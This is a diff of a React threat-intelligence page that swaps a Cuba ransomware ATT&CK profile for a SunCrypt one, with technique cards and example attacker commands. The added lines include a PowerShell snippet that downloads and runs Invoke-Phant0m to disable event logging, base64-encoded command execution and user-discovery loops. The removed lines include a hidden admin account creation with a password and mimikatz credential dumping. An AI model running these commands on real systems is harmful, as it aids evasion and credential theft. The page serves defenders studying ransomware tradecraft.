@@ -4,7 +4,7 @@ type Propx = {
   className: string
 }
 
-const Cuba: React.FC<Propx> = ({className}) => { 
+const SunCrypt: React.FC<Propx> = ({className}) => { 
   return (
 	<>
     <div className={`card mb-6 ${className}`}>
@@ -16,10 +16,9 @@ const Cuba: React.FC<Propx> = ({className}) => {
 			   <tr className='fs-6 fw-semebold text-white bg-dark text-center'>
 			    	<th className='min-w-175px border-end border-white'>Initial-Access</th>
 			    	<th className='min-w-175px border-end border-white'>Execution</th>
-			    	<th className='min-w-175px border-end border-white'>Persistence</th>
-			    	<th className='min-w-175px border-end border-white'>Privilege-Escalation</th>
 			    	<th className='min-w-175px border-end border-white'>Defense-Evasion</th>
 			    	<th className='min-w-175px border-end border-white'>Credential-Access</th>
+			    	<th className='min-w-175px border-end border-white'>Discovery</th>
 			    	<th className='min-w-175px border-end border-white'>Lateral-Movement</th>
 			    	<th className='min-w-175px border-end border-white'>Exfiltration</th>
 			    	<th className='min-w-175px border-end border-white'>Impact</th>
@@ -30,16 +29,12 @@ const Cuba: React.FC<Propx> = ({className}) => {
 					<td className='align-items-baseline border-start border-end border-dark'>
 						<div className='px-2 d-flex flex-column'>
 							<div className='symbol symbol-50px pb-1'>
-								<span className='badge badge-dark text-white fs-8 fw-bold me-2'>T1190</span>
-								<span className='text-dark fw-semibold mb-1 fs-7'>Exploit Public-Facing Application</span>
+								<span className='badge badge-dark text-white fs-8 fw-bold me-2'>T1566.001</span>
+								<span className='text-dark fw-semibold mb-1 fs-7'>Phishing: Spearphishing Attachment</span>
 							</div>
 							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
 								<div className='text-white fw-semibold d-block fs-7'>
-									<div>- CVE-2021-34473
-- CVE-2021-34523
-- CVE-2021-31207
-- CVE-2021-26855
-</div>
+									<div>Use multiple vectors to gain initial access</div>
 								</div>
 							</div>
 						</div>
@@ -53,7 +48,7 @@ const Cuba: React.FC<Propx> = ({className}) => {
 							</div>
 							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
 								<div className='text-white fw-semibold d-block fs-7'>
-									<div>Early Bird injection</div>
+									<div>Use powershell commands to download</div>
 								</div>
 							</div>
 						</div>
@@ -62,12 +57,19 @@ const Cuba: React.FC<Propx> = ({className}) => {
 					<td className='align-items-baseline border-start border-end border-dark'>
 						<div className='px-2 d-flex flex-column'>
 							<div className='symbol symbol-50px pb-1'>
-								<span className='badge badge-dark text-white fs-8 fw-bold me-2'>T1136.001</span>
-								<span className='text-dark fw-semibold mb-1 fs-7'>Create Account: Local Account</span>
+								<span className='badge badge-dark text-white fs-8 fw-bold me-2'>T1562.002</span>
+								<span className='text-dark fw-semibold mb-1 fs-7'>Impair Defenses: Disable Windows Event Logging</span>
 							</div>
 							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
 								<div className='text-white fw-semibold d-block fs-7'>
-									<div>Creates a new user Mysql</div>
+									<div>EvtOpenChannelEnum
+EvtNextChannelPath
+EvtClearLog API calls
+*API
+EveOpenChannelEnum
+EvtNextChannelPath
+EvtClearLog
+</div>
 								</div>
 							</div>
 						</div>
@@ -76,12 +78,12 @@ const Cuba: React.FC<Propx> = ({className}) => {
 					<td className='align-items-baseline border-start border-end border-dark'>
 						<div className='px-2 d-flex flex-column'>
 							<div className='symbol symbol-50px pb-1'>
-								<span className='badge badge-dark text-white fs-8 fw-bold me-2'>T1068</span>
-								<span className='text-dark fw-semibold mb-1 fs-7'>Exploitation for Privilege Escalation</span>
+								<span className='badge badge-dark text-white fs-8 fw-bold me-2'>T1003</span>
+								<span className='text-dark fw-semibold mb-1 fs-7'>OS Credential Dumping</span>
 							</div>
 							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
 								<div className='text-white fw-semibold d-block fs-7'>
-									<div>Zerologon vulnerability</div>
+									<div>CobaltStrike downloads Mimikatz and obtain administrative credentials</div>
 								</div>
 							</div>
 						</div>
@@ -90,26 +92,14 @@ const Cuba: React.FC<Propx> = ({className}) => {
 					<td className='align-items-baseline border-start border-end border-dark'>
 						<div className='px-2 d-flex flex-column'>
 							<div className='symbol symbol-50px pb-1'>
-								<span className='badge badge-dark text-white fs-8 fw-bold me-2'>T1564.003</span>
-								<span className='text-dark fw-semibold mb-1 fs-7'>Hide Artifacts: Hidden Window</span>
+								<span className='badge badge-dark text-white fs-8 fw-bold me-2'>T1033</span>
+								<span className='text-dark fw-semibold mb-1 fs-7'>System Owner/User Discovery</span>
 							</div>
 							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
 								<div className='text-white fw-semibold d-block fs-7'>
-									<div>Cuba has executed hidden PowerShell windows.</div>
-								</div>
-							</div>
-						</div>
-					</td>          
-				
-					<td className='align-items-baseline border-start border-end border-dark'>
-						<div className='px-2 d-flex flex-column'>
-							<div className='symbol symbol-50px pb-1'>
-								<span className='badge badge-dark text-white fs-8 fw-bold me-2'>T1003.001</span>
-								<span className='text-dark fw-semibold mb-1 fs-7'>OS Credential Dumping: LSASS Memory</span>
-							</div>
-							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
-								<div className='text-white fw-semibold d-block fs-7'>
-									<div>SEKURLSA::LogonPasswords module</div>
+									<div>GetUserNameA
+GetComputerA
+</div>
 								</div>
 							</div>
 						</div>
@@ -123,7 +113,7 @@ const Cuba: React.FC<Propx> = ({className}) => {
 							</div>
 							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
 								<div className='text-white fw-semibold d-block fs-7'>
-									<div>PsExec was used to move files between the infected hosts</div>
+									<div>Brute-forced RDP connection</div>
 								</div>
 							</div>
 						</div>
@@ -137,7 +127,7 @@ const Cuba: React.FC<Propx> = ({className}) => {
 							</div>
 							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
 								<div className='text-white fw-semibold d-block fs-7'>
-									<div>The exfiltrated data is published on a dedicated Cuba DLS (Data Leak Site).</div>
+									<div>Copy and exfiltrate victim data using CobaltStrike</div>
 								</div>
 							</div>
 						</div>
@@ -146,136 +136,18 @@ const Cuba: React.FC<Propx> = ({className}) => {
 					<td className='align-items-baseline border-start border-end border-dark'>
 						<div className='px-2 d-flex flex-column'>
 							<div className='symbol symbol-50px pb-1'>
-								<span className='badge badge-dark text-white fs-8 fw-bold me-2'>T1486</span>
-								<span className='text-dark fw-semibold mb-1 fs-7'>Data Encrypted for Impact</span>
+								<span className='badge badge-dark text-white fs-8 fw-bold me-2'>T1490</span>
+								<span className='text-dark fw-semibold mb-1 fs-7'>Inhibit System Recovery</span>
 							</div>
 							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
 								<div className='text-white fw-semibold d-block fs-7'>
-									<div>- ChaCha20
-- RSA-4096
-- .cuba
-</div>
+									<div>Use batch script to delete shadow copies</div>
 								</div>
 							</div>
 						</div>
 					</td>          
 				</tr>
 				<tr className=''>				
-					<td className='align-items-baseline border-start border-end border-dark'>
-						<div className='px-2 d-flex flex-column'>
-							<div className='symbol symbol-50px pb-1'>
-								<span className='badge badge-dark text-white fs-8 fw-bold me-2'></span>
-								<span className='text-dark fw-semibold mb-1 fs-7'></span>
-							</div>
-							
-						</div>
-					</td>          
-				
-					<td className='align-items-baseline border-start border-end border-dark'>
-						<div className='px-2 d-flex flex-column'>
-							<div className='symbol symbol-50px pb-1'>
-								<span className='badge badge-dark text-white fs-8 fw-bold me-2'></span>
-								<span className='text-dark fw-semibold mb-1 fs-7'></span>
-							</div>
-							
-						</div>
-					</td>          
-				
-					<td className='align-items-baseline border-start border-end border-dark'>
-						<div className='px-2 d-flex flex-column'>
-							<div className='symbol symbol-50px pb-1'>
-								<span className='badge badge-dark text-white fs-8 fw-bold me-2'></span>
-								<span className='text-dark fw-semibold mb-1 fs-7'></span>
-							</div>
-							
-						</div>
-					</td>          
-				
-					<td className='align-items-baseline border-start border-end border-dark'>
-						<div className='px-2 d-flex flex-column'>
-							<div className='symbol symbol-50px pb-1'>
-								<span className='badge badge-dark text-white fs-8 fw-bold me-2'></span>
-								<span className='text-dark fw-semibold mb-1 fs-7'></span>
-							</div>
-							
-						</div>
-					</td>          
-				
-					<td className='align-items-baseline border-start border-end border-dark'>
-						<div className='px-2 d-flex flex-column'>
-							<div className='symbol symbol-50px pb-1'>
-								<span className='badge badge-dark text-white fs-8 fw-bold me-2'>T1036.005</span>
-								<span className='text-dark fw-semibold mb-1 fs-7'>Masquerading: Match Legitimate Name or Location</span>
-							</div>
-							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
-								<div className='text-white fw-semibold d-block fs-7'>
-									<div>360-antivirus icon and metadata, OpenVPN</div>
-								</div>
-							</div>
-						</div>
-					</td>          
-				
-					<td className='align-items-baseline border-start border-end border-dark'>
-						<div className='px-2 d-flex flex-column'>
-							<div className='symbol symbol-50px pb-1'>
-								<span className='badge badge-dark text-white fs-8 fw-bold me-2'></span>
-								<span className='text-dark fw-semibold mb-1 fs-7'></span>
-							</div>
-							
-						</div>
-					</td>          
-				
-					<td className='align-items-baseline border-start border-end border-dark'>
-						<div className='px-2 d-flex flex-column'>
-							<div className='symbol symbol-50px pb-1'>
-								<span className='badge badge-dark text-white fs-8 fw-bold me-2'></span>
-								<span className='text-dark fw-semibold mb-1 fs-7'></span>
-							</div>
-							
-						</div>
-					</td>          
-				
-					<td className='align-items-baseline border-start border-end border-dark'>
-						<div className='px-2 d-flex flex-column'>
-							<div className='symbol symbol-50px pb-1'>
-								<span className='badge badge-dark text-white fs-8 fw-bold me-2'></span>
-								<span className='text-dark fw-semibold mb-1 fs-7'></span>
-							</div>
-							
-						</div>
-					</td>          
-				
-					<td className='align-items-baseline border-start border-end border-dark'>
-						<div className='px-2 d-flex flex-column'>
-							<div className='symbol symbol-50px pb-1'>
-								<span className='badge badge-dark text-white fs-8 fw-bold me-2'></span>
-								<span className='text-dark fw-semibold mb-1 fs-7'></span>
-							</div>
-							
-						</div>
-					</td>          
-				</tr>
-				<tr className=''>				
-					<td className='align-items-baseline border-start border-end border-dark'>
-						<div className='px-2 d-flex flex-column'>
-							<div className='symbol symbol-50px pb-1'>
-								<span className='badge badge-dark text-white fs-8 fw-bold me-2'></span>
-								<span className='text-dark fw-semibold mb-1 fs-7'></span>
-							</div>
-							
-						</div>
-					</td>          
-				
-					<td className='align-items-baseline border-start border-end border-dark'>
-						<div className='px-2 d-flex flex-column'>
-							<div className='symbol symbol-50px pb-1'>
-								<span className='badge badge-dark text-white fs-8 fw-bold me-2'></span>
-								<span className='text-dark fw-semibold mb-1 fs-7'></span>
-							</div>
-							
-						</div>
-					</td>          
-				
 					<td className='align-items-baseline border-start border-end border-dark'>
 						<div className='px-2 d-flex flex-column'>
 							<div className='symbol symbol-50px pb-1'>
@@ -304,7 +176,31 @@ const Cuba: React.FC<Propx> = ({className}) => {
 							</div>
 							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
 								<div className='text-white fw-semibold d-block fs-7'>
-									<div>Base64 encoded payload</div>
+									<div>Obfuscation of strings using base64</div>
+								</div>
+							</div>
+						</div>
+					</td>          
+				
+					<td className='align-items-baseline border-start border-end border-dark'>
+						<div className='px-2 d-flex flex-column'>
+							<div className='symbol symbol-50px pb-1'>
+								<span className='badge badge-dark text-white fs-8 fw-bold me-2'></span>
+								<span className='text-dark fw-semibold mb-1 fs-7'></span>
+							</div>
+							
+						</div>
+					</td>          
+				
+					<td className='align-items-baseline border-start border-end border-dark'>
+						<div className='px-2 d-flex flex-column'>
+							<div className='symbol symbol-50px pb-1'>
+								<span className='badge badge-dark text-white fs-8 fw-bold me-2'>T1082</span>
+								<span className='text-dark fw-semibold mb-1 fs-7'>System Information Discovery</span>
+							</div>
+							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
+								<div className='text-white fw-semibold d-block fs-7'>
+									<div>Discovery Systme Information with GetSystemInfo</div>
 								</div>
 							</div>
 						</div>
@@ -333,20 +229,17 @@ const Cuba: React.FC<Propx> = ({className}) => {
 					<td className='align-items-baseline border-start border-end border-dark'>
 						<div className='px-2 d-flex flex-column'>
 							<div className='symbol symbol-50px pb-1'>
-								<span className='badge badge-dark text-white fs-8 fw-bold me-2'></span>
-								<span className='text-dark fw-semibold mb-1 fs-7'></span>
+								<span className='badge badge-dark text-white fs-8 fw-bold me-2'>T1486</span>
+								<span className='text-dark fw-semibold mb-1 fs-7'>Data Encrypted for Impact</span>
 							</div>
-							
-						</div>
-					</td>          
-				
-					<td className='align-items-baseline border-start border-end border-dark'>
-						<div className='px-2 d-flex flex-column'>
-							<div className='symbol symbol-50px pb-1'>
-								<span className='badge badge-dark text-white fs-8 fw-bold me-2'></span>
-								<span className='text-dark fw-semibold mb-1 fs-7'></span>
+							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
+								<div className='text-white fw-semibold d-block fs-7'>
+									<div>- Curve25519
+- ChaCha20
+- .(Randomstr)
+</div>
+								</div>
 							</div>
-							
 						</div>
 					</td>          
 				</tr>
@@ -394,54 +287,44 @@ const Cuba: React.FC<Propx> = ({className}) => {
 					<td className='align-items-baseline border-start border-end border-dark'>
 						<div className='px-2 d-flex flex-column'>
 							<div className='symbol symbol-50px pb-1'>
-								<span className='badge badge-dark text-white fs-8 fw-bold me-2'>T1620</span>
-								<span className='text-dark fw-semibold mb-1 fs-7'>Reflective Code Loading</span>
+								<span className='badge badge-dark text-white fs-8 fw-bold me-2'></span>
+								<span className='text-dark fw-semibold mb-1 fs-7'></span>
+							</div>
+							
+						</div>
+					</td>          
+				
+					<td className='align-items-baseline border-start border-end border-dark'>
+						<div className='px-2 d-flex flex-column'>
+							<div className='symbol symbol-50px pb-1'>
+								<span className='badge badge-dark text-white fs-8 fw-bold me-2'></span>
+								<span className='text-dark fw-semibold mb-1 fs-7'></span>
+							</div>
+							
+						</div>
+					</td>          
+				
+					<td className='align-items-baseline border-start border-end border-dark'>
+						<div className='px-2 d-flex flex-column'>
+							<div className='symbol symbol-50px pb-1'>
+								<span className='badge badge-dark text-white fs-8 fw-bold me-2'></span>
+								<span className='text-dark fw-semibold mb-1 fs-7'></span>
+							</div>
+							
+						</div>
+					</td>          
+				
+					<td className='align-items-baseline border-start border-end border-dark'>
+						<div className='px-2 d-flex flex-column'>
+							<div className='symbol symbol-50px pb-1'>
+								<span className='badge badge-dark text-white fs-8 fw-bold me-2'>T1498</span>
+								<span className='text-dark fw-semibold mb-1 fs-7'>Network Denial of Service</span>
 							</div>
 							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
 								<div className='text-white fw-semibold d-block fs-7'>
-									<div>Cuba loaded the payload into memory using PowerShell.</div>
+									<div>DDos attack</div>
 								</div>
 							</div>
-						</div>
-					</td>          
-				
-					<td className='align-items-baseline border-start border-end border-dark'>
-						<div className='px-2 d-flex flex-column'>
-							<div className='symbol symbol-50px pb-1'>
-								<span className='badge badge-dark text-white fs-8 fw-bold me-2'></span>
-								<span className='text-dark fw-semibold mb-1 fs-7'></span>
-							</div>
-							
-						</div>
-					</td>          
-				
-					<td className='align-items-baseline border-start border-end border-dark'>
-						<div className='px-2 d-flex flex-column'>
-							<div className='symbol symbol-50px pb-1'>
-								<span className='badge badge-dark text-white fs-8 fw-bold me-2'></span>
-								<span className='text-dark fw-semibold mb-1 fs-7'></span>
-							</div>
-							
-						</div>
-					</td>          
-				
-					<td className='align-items-baseline border-start border-end border-dark'>
-						<div className='px-2 d-flex flex-column'>
-							<div className='symbol symbol-50px pb-1'>
-								<span className='badge badge-dark text-white fs-8 fw-bold me-2'></span>
-								<span className='text-dark fw-semibold mb-1 fs-7'></span>
-							</div>
-							
-						</div>
-					</td>          
-				
-					<td className='align-items-baseline border-start border-end border-dark'>
-						<div className='px-2 d-flex flex-column'>
-							<div className='symbol symbol-50px pb-1'>
-								<span className='badge badge-dark text-white fs-8 fw-bold me-2'></span>
-								<span className='text-dark fw-semibold mb-1 fs-7'></span>
-							</div>
-							
 						</div>
 					</td>          
 				</tr>
@@ -456,22 +339,13 @@ const Cuba: React.FC<Propx> = ({className}) => {
 			<div className='card card-xl-stretch mb-xl-8'>
 				<div className='card-header align-items-center border-0 mt-4'>
 					<div className='symbol symbol-50px pb-1'>
-						<span className='badge badge-dark text-white fs-5 fw-bold me-1'>T1190</span>
-						<span className='text-dark fw-bold mb-1 fs-3'>- Exploit Public-Facing Application</span>
+						<span className='badge badge-dark text-white fs-5 fw-bold me-1'>T1566.001</span>
+						<span className='text-dark fw-bold mb-1 fs-3'>- Phishing: Spearphishing Attachment</span>
 					</div>
 				</div>
 				<div className='card-body pt-3'>
-					<div className='text-gray-700 fs-4 mb-7 fst-italic'>Cuba leverage ProxyLogon and ProxyShell vulnerabilities to gain initial access.</div>
-					<div className='fs-2 fw-bold pb-3'>Vulnerability</div>
-					<div className='fs-4 fw-semebold pb-5 ms-5 text-dark fst-italic'>
-						<div>&deg;&nbsp;CVE-2021-34473</div>
+					<div className='text-gray-700 fs-4 mb-7 fst-italic'>SunCrypt uses multiple vectors to gain initial access. It sends spear-phishing emails with malicious attachments.</div>
 					
-						<div>&deg;&nbsp;CVE-2021-34523</div>
-					
-						<div>&deg;&nbsp;CVE-2021-31207</div>
-					
-						<div>&deg;&nbsp;CVE-2021-26855</div>
-					</div>
 					
 					
 				</div>
@@ -489,73 +363,7 @@ const Cuba: React.FC<Propx> = ({className}) => {
 					</div>
 				</div>
 				<div className='card-body pt-3'>
-					<div className='text-gray-700 fs-4 mb-7 fst-italic'>afk.ttf uses an injection technique that allows the injected code to run before the entry point of the main thread of the process.</div>
-					
-					<div className='fs-2 fw-bold pb-3'>Command</div>
-					<div className='mb-5'>
-						<span className='badge badge-light-danger fs-7 fw-bold my-2'>windows</span>
-						<span>&nbsp;&nbsp;</span>
-						
-						<span className='badge badge-light-primary fs-7 fw-bold my-2'>psh</span>
-						<span>&nbsp;&nbsp;</span>
-					
-						<span className='badge badge-light-primary fs-7 fw-bold my-2'>pwsh</span>
-						<span>&nbsp;&nbsp;</span>
-					
-						<div className='fs-5 fw-semibold mt-2 mb-2 ms-5 text-dark fst-italic'>
-							<div>&deg;&nbsp;w3wp.exe -ap "MSExchangeOWAAppPool" -v "v4.0" -c "C:\Program Files\Microsoft\Exchange Server\V15\bin\GenericAppPoolConfiwithGCServerEnabledFalse.config" -a \\. pipe\############################# -h "C:\inetpub\temp\apppools\MSExchangeOWAAppPool\MSExchangeOWAAppPool.config" -w " -m 0</div>
-							
-						</div>
-					</div>
-					
-				</div>
-			</div>
-		</div>
-	</div>
-	<div className='fs-1 fw-bold text-dark pt-1 ps-3'>Persistence</div>
-	<div className='row g-5 g-xl-8 pt-4'>
-		<div className='col-xl-6'>
-			<div className='card card-xl-stretch mb-xl-8'>
-				<div className='card-header align-items-center border-0 mt-4'>
-					<div className='symbol symbol-50px pb-1'>
-						<span className='badge badge-dark text-white fs-5 fw-bold me-1'>T1136.001</span>
-						<span className='text-dark fw-bold mb-1 fs-3'>- Create Account: Local Account</span>
-					</div>
-				</div>
-				<div className='card-body pt-3'>
-					<div className='text-gray-700 fs-4 mb-7 fst-italic'>Creates a new user Mysql, sets the password to KJaoifhLOaiwdhadx1@!, and sets no expiration date (0x2Au). Adds this user to the previously enumerated local administrative and RDP groups. Sets the SpecialAccounts\UserList regkey for this user to hide the user from login screens and the control panel. Enables RDP by setting the `fDenyTSConnections` value to false in the Registry.</div>
-					
-					<div className='fs-2 fw-bold pb-3'>Command</div>
-					<div className='mb-5'>
-						<span className='badge badge-light-danger fs-7 fw-bold my-2'>winodws</span>
-						<span>&nbsp;&nbsp;</span>
-						
-						<span className='badge badge-light-primary fs-7 fw-bold my-2'>cmd</span>
-						<span>&nbsp;&nbsp;</span>
-					
-						<div className='fs-5 fw-semibold mt-2 mb-2 ms-5 text-dark fst-italic'>
-							<div>&deg;&nbsp;net user /add "Mysql" "KJaoifhLOaiwdhadx1@!"</div>
-							<div>&deg;&nbsp;hide_accountName(Mysql); regkey</div>
-							
-						</div>
-					</div>
-					
-				</div>
-			</div>
-		</div>
-	</div>
-	<div className='fs-1 fw-bold text-dark pt-1 ps-3'>Privilege-Escalation</div>
-	<div className='row g-5 g-xl-8 pt-4'>
-		<div className='col-xl-6'>
-			<div className='card card-xl-stretch mb-xl-8'>
-				<div className='card-header align-items-center border-0 mt-4'>
-					<div className='symbol symbol-50px pb-1'>
-						<span className='badge badge-dark text-white fs-5 fw-bold me-1'>T1068</span>
-						<span className='text-dark fw-bold mb-1 fs-3'>- Exploitation for Privilege Escalation</span>
-					</div>
-				</div>
-				<div className='card-body pt-3'>
-					<div className='text-gray-700 fs-4 mb-7 fst-italic'>Threat actors attempted to use a file called zero.exe, which is used to exploit the Zerologon vulnerability to escalate privileges.</div>
+					<div className='text-gray-700 fs-4 mb-7 fst-italic'>SunCrypt uses powershell commands to download and complie CobaltStrike.</div>
 					
 					
 					
@@ -569,45 +377,33 @@ const Cuba: React.FC<Propx> = ({className}) => {
 			<div className='card card-xl-stretch mb-xl-8'>
 				<div className='card-header align-items-center border-0 mt-4'>
 					<div className='symbol symbol-50px pb-1'>
-						<span className='badge badge-dark text-white fs-5 fw-bold me-1'>T1564.003</span>
-						<span className='text-dark fw-bold mb-1 fs-3'>- Hide Artifacts: Hidden Window</span>
+						<span className='badge badge-dark text-white fs-5 fw-bold me-1'>T1562.002</span>
+						<span className='text-dark fw-bold mb-1 fs-3'>- Impair Defenses: Disable Windows Event Logging</span>
 					</div>
 				</div>
 				<div className='card-body pt-3'>
-					<div className='text-gray-700 fs-4 mb-7 fst-italic'>Cuba has executed hidden PowerShell windows.</div>
+					<div className='text-gray-700 fs-4 mb-7 fst-italic'>At the end of the encryption routine, SunCrypt clears the event log using ClearEventLogA and a combination of EvtOpenChannelEnum/ EvtNextChannelPath / EvtClearLog API calls. *API, EveOpenChannelEnum, EvtNextChannelPath, EvtClearLog*</div>
 					
 					<div className='fs-2 fw-bold pb-3'>Command</div>
 					<div className='mb-5'>
-						<span className='badge badge-light-danger fs-7 fw-bold my-2'>winodws</span>
+						<span className='badge badge-light-danger fs-7 fw-bold my-2'>windows</span>
 						<span>&nbsp;&nbsp;</span>
 						
 						<span className='badge badge-light-primary fs-7 fw-bold my-2'>psh</span>
 						<span>&nbsp;&nbsp;</span>
 					
-						<span className='badge badge-light-primary fs-7 fw-bold my-2'>pwsh</span>
-						<span>&nbsp;&nbsp;</span>
-					
 						<div className='fs-5 fw-semibold mt-2 mb-2 ms-5 text-dark fst-italic'>
-							<div>&deg;&nbsp;Start-Process #powershell_command</div>
+							<div>&deg;&nbsp;Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned -ErrorAction Ignore</div>
+							<div>&deg;&nbsp;$url = "https://raw.githubusercontent.com/hlldz/Invoke-Phant0m/f1396c411a867e1b471ef80c5c534466103440e0/Invoke-Phant0m.ps1"</div>
+							<div>&deg;&nbsp;$output = "$env:TEMP\Invoke-Phant0m.ps1"</div>
+							<div>&deg;&nbsp;$wc = New-Object System.Net.WebClient</div>
+							<div>&deg;&nbsp;$wc.DownloadFile($url, $output)</div>
+							<div>&deg;&nbsp;cd $env:TEMP</div>
+							<div>&deg;&nbsp;Import-Module .\Invoke-Phant0m.ps1</div>
+							<div>&deg;&nbsp;Invoke-Phant0m</div>
 							
 						</div>
 					</div>
-					
-				</div>
-			</div>
-		</div>
-		<div className='col-xl-6'>
-			<div className='card card-xl-stretch mb-xl-8'>
-				<div className='card-header align-items-center border-0 mt-4'>
-					<div className='symbol symbol-50px pb-1'>
-						<span className='badge badge-dark text-white fs-5 fw-bold me-1'>T1036.005</span>
-						<span className='text-dark fw-bold mb-1 fs-3'>- Masquerading: Match Legitimate Name or Location</span>
-					</div>
-				</div>
-				<div className='card-body pt-3'>
-					<div className='text-gray-700 fs-4 mb-7 fst-italic'>It uses the 360-antivirus icon and metadata to trick the user. In a more recent sample, the ransomware is using the OpenVPN metadata.</div>
-					
-					
 					
 				</div>
 			</div>
@@ -621,25 +417,25 @@ const Cuba: React.FC<Propx> = ({className}) => {
 					</div>
 				</div>
 				<div className='card-body pt-3'>
-					<div className='text-gray-700 fs-4 mb-7 fst-italic'>Cuba has used multiple layers of obfuscation to avoid analysis, including its Base64 encoded payload.</div>
+					<div className='text-gray-700 fs-4 mb-7 fst-italic'>The SunCrypt loaders contains an embedded resource in plain text with two export functions that are called by the script after the compilation of the C# code, heavy obfuscation and a lot of junk code and useless data to harden the analysis and detection. The obfuscation of the script includes arithmetical operations, encoding and string manipulation not only for anti-analysis but probably to avoid detection by segmenting the base64 strings.</div>
 					
+					<div className='fs-2 fw-bold pb-3'>Command</div>
+					<div className='mb-5'>
+						<span className='badge badge-light-danger fs-7 fw-bold my-2'>windows</span>
+						<span>&nbsp;&nbsp;</span>
+						
+						<span className='badge badge-light-primary fs-7 fw-bold my-2'>psh</span>
+						<span>&nbsp;&nbsp;</span>
 					
-					
-				</div>
-			</div>
-		</div>
-		<div className='col-xl-6'>
-			<div className='card card-xl-stretch mb-xl-8'>
-				<div className='card-header align-items-center border-0 mt-4'>
-					<div className='symbol symbol-50px pb-1'>
-						<span className='badge badge-dark text-white fs-5 fw-bold me-1'>T1620</span>
-						<span className='text-dark fw-bold mb-1 fs-3'>- Reflective Code Loading</span>
+						<div className='fs-5 fw-semibold mt-2 mb-2 ms-5 text-dark fst-italic'>
+							<div>&deg;&nbsp;$OriginalCommand = '#powershell_command'</div>
+							<div>&deg;&nbsp;$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)</div>
+							<div>&deg;&nbsp;$EncodedCommand =[Convert]::ToBase64String($Bytes)</div>
+							<div>&deg;&nbsp;$EncodedCommand</div>
+							<div>&deg;&nbsp;powershell.exe -EncodedCommand $EncodedCommand</div>
+							
+						</div>
 					</div>
-				</div>
-				<div className='card-body pt-3'>
-					<div className='text-gray-700 fs-4 mb-7 fst-italic'>Cuba loaded the payload into memory using PowerShell.</div>
-					
-					
 					
 				</div>
 			</div>
@@ -651,12 +447,31 @@ const Cuba: React.FC<Propx> = ({className}) => {
 			<div className='card card-xl-stretch mb-xl-8'>
 				<div className='card-header align-items-center border-0 mt-4'>
 					<div className='symbol symbol-50px pb-1'>
-						<span className='badge badge-dark text-white fs-5 fw-bold me-1'>T1003.001</span>
-						<span className='text-dark fw-bold mb-1 fs-3'>- OS Credential Dumping: LSASS Memory</span>
+						<span className='badge badge-dark text-white fs-5 fw-bold me-1'>T1003</span>
+						<span className='text-dark fw-bold mb-1 fs-3'>- OS Credential Dumping</span>
 					</div>
 				</div>
 				<div className='card-body pt-3'>
-					<div className='text-gray-700 fs-4 mb-7 fst-italic'>It uses the SEKURLSA::LogonPasswords module to list all available provider credentials, and this was observed in the Target.process.Ext.memory_region.strings fields.</div>
+					<div className='text-gray-700 fs-4 mb-7 fst-italic'>And CobaltStrike downloads Mimikatz and obtain administrative credentials using it.</div>
+					
+					
+					
+				</div>
+			</div>
+		</div>
+	</div>
+	<div className='fs-1 fw-bold text-dark pt-1 ps-3'>Discovery</div>
+	<div className='row g-5 g-xl-8 pt-4'>
+		<div className='col-xl-6'>
+			<div className='card card-xl-stretch mb-xl-8'>
+				<div className='card-header align-items-center border-0 mt-4'>
+					<div className='symbol symbol-50px pb-1'>
+						<span className='badge badge-dark text-white fs-5 fw-bold me-1'>T1033</span>
+						<span className='text-dark fw-bold mb-1 fs-3'>- System Owner/User Discovery</span>
+					</div>
+				</div>
+				<div className='card-body pt-3'>
+					<div className='text-gray-700 fs-4 mb-7 fst-italic'>The system survey also consists of gathering username and hostname information by calling GetUserNameA and GetComputerA functions.</div>
 					
 					<div className='fs-2 fw-bold pb-3'>Command</div>
 					<div className='mb-5'>
@@ -667,10 +482,33 @@ const Cuba: React.FC<Propx> = ({className}) => {
 						<span>&nbsp;&nbsp;</span>
 					
 						<div className='fs-5 fw-semibold mt-2 mb-2 ms-5 text-dark fst-italic'>
-							<div>&deg;&nbsp;"sekurlsa::minidump #input_file" "sekurlsa::logonpasswords full" exit</div>
+							<div>&deg;&nbsp;cmd.exe /C whoami</div>
+							<div>&deg;&nbsp;wmic useraccount get /ALL</div>
+							<div>&deg;&nbsp;quser /SERVER:"#computer_name"</div>
+							<div>&deg;&nbsp;quser</div>
+							<div>&deg;&nbsp;qwinsta.exe /server:#computer_name</div>
+							<div>&deg;&nbsp;qwinsta.exe</div>
+							<div>&deg;&nbsp;for /F "tokens=1,2" %i in ('qwinsta /server:#computer_name ^| findstr "Active Disc"') do @echo %i | find /v "#" | find /v "console" || echo %j  computers.txt</div>
+							<div>&deg;&nbsp;@FOR /F %n in (computers.txt) DO @FOR /F "tokens=1,2" %i in ('qwinsta /server:%n ^| findstr "Active Disc"') do @echo %i | find /v "#" | find /v "console" || echo %j  usernames.txt</div>
 							
 						</div>
 					</div>
+					
+				</div>
+			</div>
+		</div>
+		<div className='col-xl-6'>
+			<div className='card card-xl-stretch mb-xl-8'>
+				<div className='card-header align-items-center border-0 mt-4'>
+					<div className='symbol symbol-50px pb-1'>
+						<span className='badge badge-dark text-white fs-5 fw-bold me-1'>T1082</span>
+						<span className='text-dark fw-bold mb-1 fs-3'>- System Information Discovery</span>
+					</div>
